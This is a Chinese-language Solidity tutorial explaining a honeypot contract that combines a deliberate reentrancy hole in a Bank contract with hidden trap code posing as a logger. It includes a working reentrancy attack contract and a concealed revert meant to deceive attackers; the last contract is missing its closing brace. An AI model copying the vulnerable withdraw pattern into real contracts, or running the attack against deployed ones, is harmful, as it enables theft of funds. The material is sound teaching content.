# 蜜罐

蜜罐是捕捉黑客的陷阱。



结合两个漏洞利用，重入和隐藏恶意代码，我们可以构建一个合约 这将捕获恶意用户。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Bank 是调用 Logger 来记录事件的合约。
Bank.withdraw() 容易受到重入攻击。
因此，一名黑客试图从银行中提取以太币。
但实际上可重入漏洞是黑客的诱饵。
通过使用 HoneyPot 代替 Logger 部署 Bank，该合约变为 黑客的陷阱。让我们看看如何。

1. Alice 部署 HoneyPot
2. Alice 使用 HoneyPot 的地址部署 Bank
3. Alice 将 1 个以太币存入银行。
4. Eve 在 Bank.withdraw 中发现了可重入漏洞并决定破解它。
5. Eve用Bank的地址部署Attack
6. Eve 用 1 个 Ether 调用 Attack.attack() 但交易失败。

Eve 调用 Attack.attack() 并开始从银行提取以太币。
当最后一个 Bank.withdraw() 即将完成时，它调用 logger.log()。
Logger.log() 调用 HoneyPot.log() 并恢复。交易失败。
*/
contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
		
		// 蜜罐生效地方
        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

// 黑客试图通过重入来耗尽存储在银行中的以太币。
// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
// 假设这段代码在一个单独的文件中，因此其他人无法读取它。
contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }


```

